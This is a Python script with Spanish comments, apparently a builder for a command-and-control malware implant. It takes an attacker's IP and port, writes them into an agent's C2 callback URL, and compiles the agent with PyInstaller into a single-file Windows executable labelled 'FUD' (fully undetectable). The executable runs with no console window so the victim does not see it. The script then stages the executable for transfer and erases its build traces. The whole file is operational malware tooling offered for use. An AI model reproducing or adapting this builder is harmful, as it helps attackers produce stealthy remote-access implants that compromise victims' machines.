import os
import subprocess
import shutil
import sys

def build_payload(ip: str, port: str):
    print("==========================================")
    print("      C2 NATIVE BUILDER (FUD PE32+)       ")
    print("==========================================")
    
    agent_src = os.path.join("..", "agent_v2.py")
    if not os.path.exists(agent_src):
        agent_src = "agent_v2.py" # Fallback if run from root
        if not os.path.exists(agent_src):
            print("[-] Error: No se encontró el código fuente de agent_v2.py")
            sys.exit(1)
            
    # Leer el agente original
    with open(agent_src, 'r', encoding='utf-8') as f:
        code = f.read()
        
    # Inyectar las variables del servidor actual
    new_url = f"https://{ip}:{port}"
    code = code.replace('C2_URL = "https://127.0.0.1:5000"', f'C2_URL = "{new_url}"')
    
    # Escribir un archivo temporal de compilación
    temp_target = "payload_compiler_temp.py"
    with open(temp_target, 'w', encoding='utf-8') as f:
        f.write(code)
        
    print(f"[*] Compilando el implante blindado hacia {new_url}...")
    
    # Flags de ofuscación y empaquetamiento The C2 Project
    pyinstaller_cmd = [
        sys.executable, "-m", "PyInstaller",
        "--noconfirm",
        "--onefile",       # Un solo fichero autónomo
        "--windowed",      # Sin mostrar consola negra al usuario
        "--clean",
        "--name", "C2_Implant_FUD",
        temp_target
    ]
    
    try:
        subprocess.run(pyinstaller_cmd, check=True)
        print("[+] PyInstaller finalizó correctamente.")
        
        # Mover el EXE generado a una ubicación útil
        if os.path.exists("dist/C2_Implant_FUD.exe"):
            dest = os.path.join("..", "transfers", "C2_Automated_Payload.exe")
            if not os.path.exists(os.path.join("..", "transfers")):
                os.makedirs(os.path.join("..", "transfers"), exist_ok=True)
                
            shutil.copy("dist/C2_Implant_FUD.exe", dest)
            print(f"[+] ¡ÉXITO! Arma biológica compilada y extraída en: {dest}")
        else:
            print("[-] Compilación falló o no es Windows.")
            
    except subprocess.CalledProcessError as e:
        print(f"[-] Fallo catastrófico en PyInstaller: {e}")
    finally:
        # Limpiar basura de compilación
        for cleanup in [temp_target, "C2_Implant_FUD.spec"]:
            if os.path.exists(cleanup): os.remove(cleanup)
        for cleanup_dir in ["build", "dist", "__pycache__"]:
            if os.path.exists(cleanup_dir): shutil.rmtree(cleanup_dir, ignore_errors=True)

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Uso: python c2_builder.py <IP_SERVIDOR> <PUERTO>")
        print("Ej: python c2_builder.py 192.168.1.50 5000")
        sys.exit(1)
        
    build_payload(sys.argv[1], sys.argv[2])
